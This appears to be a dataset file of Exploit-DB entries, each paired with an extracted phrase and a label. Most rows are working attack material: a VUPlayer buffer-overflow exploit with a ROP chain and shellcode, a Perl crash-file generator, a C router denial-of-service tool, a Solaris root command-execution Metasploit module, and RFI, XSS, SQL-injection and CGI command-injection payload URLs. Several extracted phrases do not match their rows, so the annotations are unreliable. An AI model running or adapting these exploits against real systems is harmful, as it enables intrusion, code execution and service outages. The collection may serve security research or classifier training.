9169,"Zortam MP3 Media Studio 9.40 - Multiple Memory Corruption Vulnerabilities #!/usr/bin/perl # # # Title: Zortam MP3 Media Studio 9.40 Multiple Memory Corruption Vulnerabilities # # Product web page: http://www.zortam.com # # Desc: Zortam MP3 Studio version 9.40 suffers from a memory corruption attack from #       two different malicious files. The first method is thru a .mp3 file which #       has its ID3 tags filled with long strings. The second method is a .m3u list #       which is loaded in to the player resulting in memory corruption of the whole #       application including Dr.Watson crashing along with the app. For 1st method, #       you can click the Search Media for MP3's button and select the folder where #       the .mp3 file with the long ID3 tags is located..boom! The 2nd method, load #       .m3u file into the MP3 Player..boom boom! # # Tested on: Microsoft Windows XP Professional SP3 (English) # # # WinDbg: # # [*] overly long id3 tags (.mp3 file): # --------------------------------------------------------------------------- # # (edc.f34): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # eax=00014d6a ebx=00014d6b ecx=000052c8 edx=00029ad4 esi=03a64ffd edi=03aa3864 # eip=005788fe esp=0012cc9c ebp=00029ad4 iopl=0         nv up ei pl nz na po nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00050202 # *** ERROR: Symbol file could not be found.  Defaulted to export symbols for [path]\zmmspro.exe -  # zmmspro!ID3_FrameInfo::FieldFlags+0xdce: # 005788fe f3a5            rep movs dword ptr es:[edi],dword ptr [esi] # # --------------------------------------------------------------------------- # # # [*] long playlist (.m3u file): # --------------------------------------------------------------------------- # # (84.b98): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # eax=00000000 ebx=00000111 ecx=00000000 edx=00000000 esi=0012ed5c edi=01e33f54 # eip=005b7ad9 esp=0012ed18 ebp=0012ed2c iopl=0         nv up ei pl nz na pe nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00050206 # zmmspro!ID3_FrameInfo::FieldFlags+0x3ffa9: # 005b7ad9 8b01            mov     eax,dword ptr [ecx]  ds:0023:00000000=???????? # 0:000> g # (84.b98): Access violation - code c0000005 (!!! second chance !!!) # eax=00000000 ebx=00000111 ecx=00000000 edx=00000000 esi=0012ed5c edi=01e33f54 # eip=005b7ad9 esp=0012ed18 ebp=0012ed2c iopl=0         nv up ei pl nz na pe nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00040206 # zmmspro!ID3_FrameInfo::FieldFlags+0x3ffa9: # 005b7ad9 8b01            mov     eax,dword ptr [ecx]  ds:0023:00000000=???????? # # --------------------------------------------------------------------------- # # # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic # # liquidworm gmail com # # Zero Science Lab - http://www.zeroscience.org # # 16.07.2009 # #      # For first method, use folowing PoC file:			#  #								#  ################################################################  #								#  # - 1. http://zeroscience.org/codes/aimp2_evil.mp3     	#  #								#  # - 2. https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/9167.mp3 (2009-aimp2_evil.mp3) (mirror)	#  #								#  # - 3. http://securityreason.com/download/11/13 (mirror)	#  #								#  ################################################################  #								#  #								#    # For second method, use folowing PoC code:  #   $fle = ""Kung_PoW.m3u"";  $mna = ""A"" x 800000;  print ""\n\n[+] Creating playlist file: $fle ...\r\n"";  sleep 1;  open(m3u, "">./$fle"") || die ""\n\aCannot open $fle: $!"";  print m3u ""$mna"";  close (m3u);  print ""\n[+] Playlist file successfully created!\r\n"";  # milw0rm.com [2009-07-16]",malicious files. The first method is thru a .mp3 file which has its ID3 tags filled with long strings,1
42243,"Microsoft Windows Kernel - 'ATMFD.DLL' Out-of-Bounds Read due to Malformed Name INDEX in the CFF Table Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1213  We have encountered a Windows kernel crash in the ATMFD.DLL OpenType driver while processing a corrupted OTF font file, see below:  --- DRIVER_PAGE_FAULT_BEYOND_END_OF_ALLOCATION (d6) N bytes of memory was allocated and more than N bytes are being referenced. This cannot be protected by try-except. When possible, the guilty driver's name (Unicode string) is printed on the bugcheck screen and saved in KiBugCheckDriver. Arguments: Arg1: fb69b01e, memory referenced Arg2: 00000000, value 0 = read operation, 1 = write operation Arg3: 8f635862, if non-zero, the address which referenced memory. Arg4: 00000000, (reserved)  Debugging Details: ------------------  [...]  FAULTING_IP:  ATMFD+35862 8f635862 803802          cmp     byte ptr [eax],2  MM_INTERNAL_CODE:  0  CPU_COUNT: 4  CPU_MHZ: da3  CPU_VENDOR:  GenuineIntel  CPU_FAMILY: 6  CPU_MODEL: 3e  CPU_STEPPING: 4  CPU_MICROCODE: 6,3e,4,0 (F,M,S,R)  SIG: 19'00000000 (cache) 19'00000000 (init)  DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT  BUGCHECK_STR:  0xD6  PROCESS_NAME:  csrss.exe  CURRENT_IRQL:  2  ANALYSIS_SESSION_HOST:  WIN7-32-VM  ANALYSIS_SESSION_TIME:  03-21-2017 10:49:20.0375  ANALYSIS_VERSION: 10.0.10586.567 x86fre  LAST_CONTROL_TRANSFER:  from 8f636088 to 8f635862  STACK_TEXT:   WARNING: Stack unwind information not available. Following frames may be wrong. 9625f538 8f636088 9625f790 05f70000 9625f790 ATMFD+0x35862 9625f630 8f6355b1 9625f790 05f70000 9625f64c ATMFD+0x36088 9625f734 8f635711 9625f790 05f70000 9625f868 ATMFD+0x355b1 9625f768 8f6051b0 00000000 9625f790 05f70000 ATMFD+0x35711 9625f808 8f607279 00000004 00000001 00000002 ATMFD+0x51b0 9625f888 8f603d14 00000000 00000000 94bb3200 ATMFD+0x7279 9625f96c 8f6e7b8d 00000004 fbad2fc0 fbadaff8 ATMFD+0x3d14 9625f9b4 8f6e7adf 00000001 fbad2fc0 fbadaff8 win32k!PDEVOBJ::LoadFontFile+0x3c 9625f9f4 8f6e74fc ffa6a130 0000002e fbad2fc0 win32k!vLoadFontFileView+0x291 9625fa80 8f6d6403 9625fb58 0000002e 00000001 win32k!PUBLIC_PFTOBJ::bLoadFonts+0x209 9625facc 8f6d73d8 9625fb58 0000002e 00000001 win32k!GreAddFontResourceWInternal+0xfb 9625fc14 8164ddb6 000d9b78 0000002e 00000001 win32k!NtGdiAddFontResourceW+0x142 9625fc14 77ad6c74 000d9b78 0000002e 00000001 nt!KiSystemServicePostCall ---  The bugcheck is caused by an attempt to read memory from an unmapped address. The specific expression being dereferenced by ATMFD.DLL is ""base address of the Name INDEX data + NAME.offset[x] - 1"", however no bounds checking is performed over the value of NAME.offset[x] before using it for pointer arithmetic. To our current knowledge, this condition can only lead to an out-of-bounds read, thus limiting the impact of the bug to remote denial of service, or potentially local kernel memory disclosure. However, we have not fully confirmed that the severity of the bug is not in fact more significant due to some further ATMFD logic we are not aware of.  Interestingly, the crash is almost identical to the one reported in  Issue #386  (MSRC-30296) nearly two years ago, which was supposedly fixed as CVE-2015-2461 in the MS15-080 bulletin. The fact that the same bugcheck still reproduces can potentially mean that the patch was insufficient.  Only a single bitflip applied to a valid font file is sufficient to create an offending testcase (excluding SFNT table checksums). In our case, the byte at offset 0x375 in the original sample must be changed from 0x01 to 0x41. This corresponds to offset 0x71 of the ""CFF "" table. The PoC font can be found attached to this tracker entry.  The issue reproduces on Windows 7 (other platforms untested). It is easiest to reproduce with Special Pools enabled for ATMFD.DLL, leading to an immediate crash when the bug is triggered. The bugcheck occurs upon opening the font in any default utility such as the Windows Font Viewer -- no special tools are required.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42243.zip",processing a corrupted OTF font file,1
30437,Global Centre Aplomb Poll 1.1 - 'vote.php?Madoa' Remote File Inclusion source: https://www.securityfocus.com/bid/25138/info   Aplomb Poll is prone to multiple remote file-include vulnerabilities because the application fails to properly sanitize user-supplied input.   An attacker can exploit these issues to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.   Aplomb Poll 1.1 is vulnerable; other versions may also be affected.   http://www.example.com/vote.php?Madoa=http://sheel.txt?,include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process,1
13756,"VUPlayer 2.49 - '.m3u' File Universal Buffer Overflow (DEP Bypass) (1) #!/usr/bin/env python # # VUPlayer <=2.49 .M3u Universal buffer overflow exploit w/ DEP bypass # Author: mr_me # Download: http://vuplayer.com/ # Tested on Wind0ws XP SP3 /noexecute=alwayson # Greetz: Corelan Security Team # http://www.corelan.be:8800/index.php/security/corelan-team-members/ #  # DEP AlwaysOn bypass version # Thanks to Sud0 & Lincoln, for the motivation to learn this :-) #   # http://www.metasploit.com # EXITFUNC=process, CMD=calc.exe sc = (""\x89\xe1\xd9\xee\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"" ""\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"" ""\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"" ""\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"" ""\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"" ""\x48\x47\x34\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55\x47"" ""\x4c\x4c\x4b\x43\x4c\x45\x55\x42\x58\x45\x51\x4a\x4f\x4c"" ""\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"" ""\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46"" ""\x51\x49\x50\x4c\x59\x4e\x4c\x4d\x54\x49\x50\x42\x54\x45"" ""\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c"" ""\x34\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4b\x55\x4c"" ""\x4b\x51\x4f\x47\x54\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44"" ""\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c"" ""\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4c\x49\x51\x4c\x46"" ""\x44\x44\x44\x48\x43\x51\x4f\x50\x31\x4a\x56\x45\x30\x50"" ""\x56\x42\x44\x4c\x4b\x51\x56\x50\x30\x4c\x4b\x51\x50\x44"" ""\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45"" ""\x58\x4b\x39\x4a\x58\x4d\x53\x49\x50\x42\x4a\x50\x50\x43"" ""\x58\x4a\x50\x4d\x5a\x44\x44\x51\x4f\x45\x38\x4a\x38\x4b"" ""\x4e\x4c\x4a\x44\x4e\x50\x57\x4b\x4f\x4d\x37\x42\x43\x43"" ""\x51\x42\x4c\x42\x43\x43\x30\x41\x41"");  crash = ""HTTP://"" + ""\x41"" * 1005  rop = ""\xd3\x72\x60\x10"" # POPAD # JE SHORT BASSMIDI.10607337		: 0x106072D3  rop += ""\x2f\x10\x60\x10"" # POP EDI # MOV EAX,ESI # POP ESI # RETN	: 0x1060102F rop += ""\x13\x22\x80\x7c"" # @ of WriteProcessMemory()				: 0x7C802213 rop += ""\xcf\x22\x80\x7c"" # Address to patched in kernel32			: 0x7C8022CF rop += ""\x44\x44\x44\x44"" # JUNK									: 0x44444444 rop += ""\xff\xff\xff\xff"" # start @ -1 for shellcode size			: 0xffffffff rop += ""\x15\x10\x10\x10"" # This @ from .data segment of app dll	: 0x10101015  rop += ""\x44\x44\x44\x44"" # JUNK									: 0x44444444 rop += ""\x44\x44\x44\x44"" # JUNK									: 0x44444444 rop += ""\x44\x44\x44\x44"" # JUNK									: 0x44444444 rop += ""\x79\x21\x60\x10"" # POP EDI # POP ESI # RETN				: 0x10602179 rop += ""\x88\x71\x60\x10"" # CALL EAX								: 0x10607188 rop += ""\xff\xff\xff\xff"" # -hProcess argv[1]						: 0xffffffff  # Get the length of shellcode - @ from kernel32 rop += ""\x6f\x10\x81\x7c"" * 305 # INC EBX # RETN					: 0x7C81106F  # push all args on the stack for WPM() - @ from shell32.dll rop += ""\xf9\x18\xa1\x7c"" # PUSHAD # RETN							: 0x7CA118F9  buffer = crash + rop + sc  print ""[+] Building .m3u file"" file = open('cst-vuplayer.m3u','w'); file.write(buffer); file.close(); print ""[+] Done""",a specially crafted .m3u file,1
22447,"HP Instant TopTools 5.0 - Remote Denial of Service source: https://www.securityfocus.com/bid/7246/info  It has been reported that Instant TopTools does not properly handle some types of requests. Because of this, a remote user could potentially deny service to a host using the vulnerable software.   http://www.example.com/cgi-bin/hpnst.exe?c=p+i=hpnst.exe",the vulnerable software,1
37360,"GeniXCMS 0.0.3 - Cross-Site Scripting # Exploit Title:  Persistent XSS # Google Dork: intitle: Persistent XSS # Date: 2015-06-21 # Exploit Author:  John Page ( hyp3rlinx ) # Website: hyp3rlinx.altervista.org # Vendor Homepage: genixcms.org # Software Link: genixcms.org # Version: 0.0.3 # Tested on: windows 7 # Category: webapps   Vendor: ============================================= genixcms.org    Product: ===================================================== GeniXCMS v0.0.3 is a PHP based content management system    Advisory Information: =================================================== Multiple persistent & reflected XSS vulnerabilities    Vulnerability Details: ========================================================= GeniXCMS v0.0.3 is vulnerable to persistent and reflected XSS    XSS Exploit code(s): ====================  Persistent XSS: ----------------------- http://localhost/GeniXCMS-master/GeniXCMS-master/gxadmin/index.php?page=posts&act=add&token=  1-content input field content injected XSS will execute after posting is published  2-title input field title injected XSS will execute immediate.   Relected XSS: --------------------- http://localhost/GeniXCMS-master/GeniXCMS-master/gxadmin/index.php?page=posts&q=1'<script>alert('XSS By Hyp3rlinx')</script>    Disclosure Timeline: ========================================================= Vendor Notification: NA June 21, 2015 : Public Disclosure    Severity Level: ========================================================= Med    Description: =========================================================  Request Method(s):         [+] GET & POST    Vulnerable Product:        [+] GeniXCMS 0.0.3    Vulnerable Parameter(s):   [+] q, content & title                          Affected Area(s):          [+] index.php                                                          ===============================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.   (hyp3rlinx)",specially crafted environment variables,1
19761,"Sambar Server 4.2 Beta 7 - Batch CGI source: https://www.securityfocus.com/bid/1002/info  The Sambar Web/FTP/Proxy Server for Windows NT and 2000 supports DOS-style batch programs as CGI scripts. A remote attacker can use any batch file used by the server in the 'cgi-bin' directory to run any valid command-line program with administrator privileges. This allows the attacker to read, modify, create, or delete any file or directory on the system, including user accounts, etc. Even if the user hasn't enabled or created any batch files, the software ships with two by default: 'hello.bat' and 'echo.bat'.  http://target/cgi-bin/hello.bat?&dir+c:or http://target/cgi-bin/echo.bat?&dir+c:\",use any batch file used by the server in the 'cgi-bin' directory to run any valid command-line program with administrator privileges,1
22415,"3Com SuperStack II RAS 1500 - IP Header Denial of Service // source: https://www.securityfocus.com/bid/7175/info   vulnerability has been reported in the 3Com SuperStack II RAS 1500 router. The problem occurs when processing network packets containing malicious IP headers. When received, the packet may cause the router to crash.  /*  * 3com superstack II RAS 1500 remote Denial of Service  *  * Piotr Chytla <pch@isec.pl>  *  * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*  * IT IS PROVIDED ""AS IS"" AND WITHOUT ANY WARRANTY  *  * (c) 2003 Copyright by iSEC Security Research  */  #include <stdio.h> #include <sys/types.h> #include <sys/socket.h> #include <libnet.h> #define OPT_LEN 4 void usage() {   printf(""Args: \n"");   printf(""-s [source address]\n"");   printf(""-d [destination address]\n""); }  int main(int argc,char *argv[]) {  char a;  int sock,r;  u_long src;  u_long dst;  char pktbuf[IP_MAXPACKET];  char payload[]=""ABCDEFGHIJKLMNOPRST"";  u_char options[4];  struct ipoption ipopt;  bzero(options,OPT_LEN);  while((a=getopt(argc,argv,""d:s:h?""))!=EOF)  {      switch(a) {          case 'h' : { usage(); exit(1); }          case 's' : { src=libnet_name_resolve(optarg,0); break;}          case 'd' : { dst=libnet_name_resolve(optarg,0); break;}         }  }  sock = libnet_open_raw_sock(IPPROTO_RAW);  if (sock<0)  {  perror(""socket"");  exit(1);  }   libnet_build_ip(strlen(payload),0,0x1337,0,255,0xaa,src,dst,payload,strlen(payload),pktbuf);   memcpy(ipopt.ipopt_list, options, OPT_LEN);   *(ipopt.ipopt_list)     = 0xe4;   *(ipopt.ipopt_list+1)   = 0;   *(ipopt.ipopt_list+1)   = 0;   *(ipopt.ipopt_list+1)   = 0;   r=libnet_insert_ipo(&ipopt,OPT_LEN,pktbuf);   if (r <0)    {         libnet_close_raw_sock(sock);         printf(""Error ip options insertion failed\n"");         exit(1);    }   r=libnet_write_ip(sock,pktbuf,LIBNET_IP_H+OPT_LEN+strlen(payload));   if (r<0)   {    libnet_close_raw_sock(sock);    printf(""Error write_ip \n"");    exit(1);   }  libnet_close_raw_sock(sock);  return 0; }",malicious IP headers,1
32800,"Poppler 0.10.3 - Denial of Service source: https://www.securityfocus.com/bid/33749/info  Poppler is prone to multiple denial-of-service vulnerabilities when handling malformed PDF files.  Successfully exploiting this issue allows remote attackers to crash applications that use the vulnerable library, denying service to legitimate users.  These issues affect versions prior to Poppler 0.10.4.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32800.pdf",malformed PDF files,1
5366,"Sun Solaris 10 - rpc.ypupdated Remote Code Execution (Metasploit)                       ____      ____     __    __                      /    \    /    \   |  |  |  |         ----====####/  /\__\##/  /\  \##|  |##|  |####====----                    |  |      |  |__|  | |  |  |  |                    |  |  ___ |   __   | |  |  |  |   ------======######\  \/  /#|  |##|  |#|  |##|  |######======------                      \____/  |__|  |__|  \______/                                                                           Computer Academic Underground                         http://www.caughq.org                             Exploit Code  ===============/======================================================== Exploit ID:     CAU-EX-2008-0001 Release Date:   2008.04.04 Title:          ypupdated_exec.rb Description:    Solaris ypupdated Command Execution Tested:         Solaris x86/sparc 10, sparc 9, 8, 2.7 Attributes:     Remote, NULL Auth, Elevated Privileges, Metasploit Exploit URL:    http://www.caughq.org/exploits/CAU-EX-2008-0001.txt Author/Email:   I)ruid <druid (@) caughq.org> ===============/========================================================  Description ===========  This exploit targets a weakness in the way the ypupdated RPC application uses the command shell when handling a MAP UPDATE request.  Extra commands may be launched through this command shell, which runs as root on the remote host, by passing commands in the format '|<command>'.   Credits =======  Josh D. <mcpheea@cadvision.com> from Avalon Security Research is credited with originally discovering this vulnerability.  This Metasploit exploit module was modeled after kcope's exploit released to Milw0rm on 2008.03.20.   References ==========  http://osvdb.org/displayvuln.php?osvdb_id=11517 http://cve.mitre.org/cgi-bin/cvename.cgi?name=1999-0209 https://www.securityfocus.com/bid/1749/info http://www.milw0rm.com/exploits/5282   Metasploit ==========  require 'msf/core'  module Msf  class Exploits::Solaris::Sunrpc::YPUpdateDExec < Msf::Exploit::Remote  	include Exploit::Remote::SunRPC  	def initialize(info = {}) 		super(update_info(info,	 			'Name'           => 'Solaris ypupdated Command Execution', 			'Description'    => %q{ 				This exploit targets a weakness in the way the ypupdated RPC 				application uses the command shell when handling a MAP UPDATE 				request.  Extra commands may be launched through this command 				shell, which runs as root on the remote host, by passing 				commands in the format '|<command>'.  				Vulnerable systems include Solaris 2.7, 8, 9, and 10, when 				ypupdated is started with the '-i' command-line option. 			}, 			'Author'         => [ 'I)ruid <druid@caughq.org>' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 4498 $', 			'References'     => 				[ 					['BID', '1749'], 					['CVE', '1999-0209'], 					['OSVDB', '11517'], 				], 			'Privileged'     => true, 			'Platform'       => ['unix', 'solaris'], 			'Arch'           => ARCH_CMD, 			'Payload'        => 				{ 					'Space'    => 1024, 					'DisableNops' => true, 				}, 			'Targets'        => [ ['Automatic', { }], ], 			'DefaultTarget' => 0 		))  		register_options( 			[ 				OptString.new('HOSTNAME', [false, 'Remote hostname', 'localhost']), 				OptInt.new('GID', [false, 'GID to emulate', 0]), 				OptInt.new('UID', [false, 'UID to emulate', 0]) 			], self.class 		) 	end  	def exploit 		hostname  = datastore['HOSTNAME'] 		program   = 100028 		progver   = 1 		procedure = 1  		print_status 'Sending PortMap request for ypupdated program' 		pport = sunrpc_create('udp', program, progver)  		print_status ""Sending MAP UPDATE request with command '#{payload.encoded}'"" 		print_status 'Waiting for response...' 		sunrpc_authunix(hostname, datastore['UID'], datastore['GID'], []) 		command = '|' + payload.encoded 		msg = XDR.encode(command, 2, 0x78000000, 2, 0x78000000) 		sunrpc_call(procedure, msg)  		sunrpc_destroy  		print_good 'No Errors, appears to have succeeded!' 	rescue ::Rex::Proto::SunRPC::RPCTimeout 		print_status 'Warning: ' + $! 		print_status 'Exploit may or may not have succeeded.' 	end  end end	  # milw0rm.com [2008-04-04]",passing commands in the format '|<command,1
46835,XOOPS 2.5.9 - SQL Injection [+] Sql Injection on XOOPS CMS v.2.5.9  [+] Date: 12/05/2019  [+] Risk: High  [+] CWE Number : CWE-89  [+] Author: Felipe Andrian Peixoto  [+] Vendor Homepage: https://xoops.org/  [+] Contact: felipe_andrian@hotmail.com  [+] Tested on: Windows 7 and Gnu/Linux  [+] Dork: inurl:gerar_pdf.php inurl:modules // use your brain ;)  [+] Exploit :           http://host/patch/modules/patch/gerar_pdf.php?cid= [SQL Injection]      [+] EOF,a malicious web site,1
